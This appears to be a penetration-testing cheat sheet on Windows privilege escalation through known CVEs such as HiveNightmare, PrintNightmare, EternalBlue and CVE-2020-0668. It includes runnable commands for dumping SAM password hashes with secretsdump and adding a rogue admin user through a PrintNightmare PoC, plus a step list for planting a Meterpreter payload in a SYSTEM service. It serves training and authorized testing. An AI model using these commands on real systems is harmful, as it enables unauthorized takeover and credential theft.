### **Overview**

- Kernel exploits target _vulnerabilities in Windows OS_ to gain _SYSTEM-level_ access.
- Can exploit missing patches, misconfigurations, or legacy services.
- Common on _unpatched or mismanaged systems_.
- Some exploits are _RCEs_ but usable for _local escalation_ (e.g., _MS08-067_, _MS17-010_).

---

## Vulnerability Examples

### **MS08-067 (NetAPI)**

- RCE in the "Server" service (RPC handling).
- Affects: XP, 2000, 2003, Vista, 2008.
- Can escalate via _local port forwarding_ if SMB is not externally accessible.

### **MS17-010 (EternalBlue)**

- RCE via _SMBv1 protocol_ misuse.
- Affects: Windows 7/8/10, Server 2008/2012/2016.
- Leveraged via local access if SMB is blocked externally.

### **ALPC Task Scheduler 0-Day**

- Allows _arbitrary DACL writes_ via Task Scheduler.
- Exploits `SchRpcSetSecurity` API + Spooler DLL hijack.
- NT AUTHORITY\SYSTEM execution.

### **CVE-2021-36934 (HiveNightmare / SeriousSam)**

- _Overly permissive ACLs_ on SYSTEM files (SAM, SYSTEM, SECURITY).
- Can be exploited to dump _NTLM hashes_.
- Requires:
    - Shadow copies present.
    - Readable SAM file by `BUILTIN\Users`.

#### **Check ACLs**
```cmd
icacls C:\Windows\System32\config\SAM
```
#### **Exploit Execution**
```cmd
.\HiveNightmare.exe
```

#### **Extract Hashes**
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```


---
## CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)

- Allows _remote or local code execution_ via Print Spooler service.
- Exploits `RpcAddPrinterDriver`.
- Requires Spooler service to be running.

#### **Check Spooler**
```cmd
ls \\localhost\pipe\spoolss
```

#### **Add Admin (PoC)**
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser hacker -NewPassword Pwnd1234! -DriverName PrintIt
```

#### **Verify**
```cmd
net user hacker
```


---

## CVE-2020-0668 (Service Tracing File Move)

- Exploits _privileged file move_ via Tracing & symbolic links.
- Chains with writable SYSTEM binary for escalation (e.g., Mozilla Maintenance Service).

#### **Steps**

1. Compile CVE-2020-0668 exploit.
2. Generate _malicious binary_ using `msfvenom`.
3. Use exploit to move binary to privileged location.
4. Overwrite corrupted moved file with clean copy.
5. Start vulnerable service (e.g., MozillaMaintenance).
6. Receive SYSTEM Meterpreter shell.

## Exploitable Binary: Mozilla Maintenance Service

- Service runs as SYSTEM and is startable by unprivileged users.
- File path: `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

#### **Exploit Chain**

1. Run CVE-2020-0668 to gain full control over binary path.
2. Replace binary with Meterpreter payload.
3. Start service â†’ gain SYSTEM shell.


